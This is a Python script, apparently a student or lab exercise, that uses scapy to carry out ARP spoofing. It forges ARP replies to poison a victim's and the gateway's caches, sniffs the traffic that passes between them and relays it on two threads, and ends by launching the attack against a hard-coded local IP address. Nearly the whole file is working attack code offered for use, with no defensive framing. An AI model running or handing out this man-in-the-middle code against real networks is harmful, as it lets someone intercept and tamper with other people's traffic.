# send the gw arp replies in intervals: 
# send the victim arp replies in intevals:



# thread1 is forwarding info from gw to victim
# thread2 is forwarding info from victim tp gw

# data from gw to victim: should change "src" value to my MAC
# data from victim to gw: should change dest value to me.


# testing: 
# 1. sniff with wireshark and see if I (as an attacker) see my MAC in the icmp messages(pings)
# that were adressed to the victim ip.



import scapy.all as scapy
import re #re functions used to parse strings #
import subprocess # subprocess functions used #
from scapy.config import conf
from scapy.layers.l2 import Ether, ARP
from scapy.packet import ls
from scapy.sendrecv import srp, sendp, sniff
import datetime
import time
import threading
 
def GW_IP_FINDER():
    return conf.route.route("0.0.0.0")[2]
 
def ArpReplyGen(gw_ip ,attack_mac , victim_mac , victim_ip):
    arp_packet = Ether() / ARP()
    arp_packet[ARP].hwsrc = attack_mac    
    arp_packet[ARP].pdst = victim_ip    
    arp_packet[Ether].hwdst = victim_mac      
    arp_packet[ARP].psrc = gw_ip      
    arp_packet[ARP].op = 2     
    return arp_packet


def GW_TO_Victim_handler(packet,default_gw_mac,gw_ip ,attack_mac , victim_mac , victim_ip):
    packet[Ether].dst = victim_mac
    packet[Ether].src = attack_mac
    sendp(packet)

def gw_to_victim(default_gw_mac,gw_ip ,attack_mac , victim_mac , victim_ip, seconds_to_run):
    sniff(filter = f"dst host {victim_ip} and src host {gw_ip}",prn=lambda packet: GW_TO_Victim_handler(packet, default_gw_mac, gw_ip ,attack_mac , victim_mac , victim_ip),timeout=seconds_to_run)

def victim2gw_handler(packet,default_gw_mac,gw_ip ,attack_mac , victim_mac , victim_ip):
    packet[Ether].dst = default_gw_mac
    packet[Ether].src = attack_mac
    sendp(packet)

def victim2gw(default_gw_mac,gw_ip ,attack_mac , victim_mac , victim_ip, seconds_to_run):
    sniff(filter = f"src host {victim_ip} and dst host {gw_ip}", prn=lambda packet: victim2gw_handler(packet, default_gw_mac, gw_ip ,attack_mac , victim_mac , victim_ip), timeout=seconds_to_run)


def ArpSpoofer(victim_ip, seconds_to_run):
    gw_ip = GW_IP_FINDER()
    attack_mac = Ether().src
    victim_mac = scapy.getmacbyip(victim_ip) 
    default_gw_mac = scapy.getmacbyip(gw_ip)

    arp_response_packet_victim = ArpReplyGen(gw_ip,attack_mac,victim_mac,victim_ip)
    arp_response_packet_gw = ArpReplyGen(victim_ip,attack_mac,default_gw_mac,gw_ip)

    time_start = datetime.datetime.now()

    t1 = threading.Thread(target=gw_to_victim, args=(default_gw_mac,gw_ip,attack_mac,victim_mac,victim_ip,seconds_to_run))
    t2 = threading.Thread(target=victim2gw, args=(default_gw_mac,gw_ip,attack_mac,victim_mac,victim_ip,seconds_to_run))

    sendp(arp_response_packet_victim)
    sendp(arp_response_packet_gw)
    time.sleep(1)
    t1.start()
    t2.start()

    while (datetime.datetime.now()-time_start).total_seconds() < seconds_to_run:
        time.sleep(5)
        sendp(arp_response_packet_victim)
        sendp(arp_response_packet_gw)

    t1.join()
    t2.join()


ArpSpoofer("10.1.0.174",10)
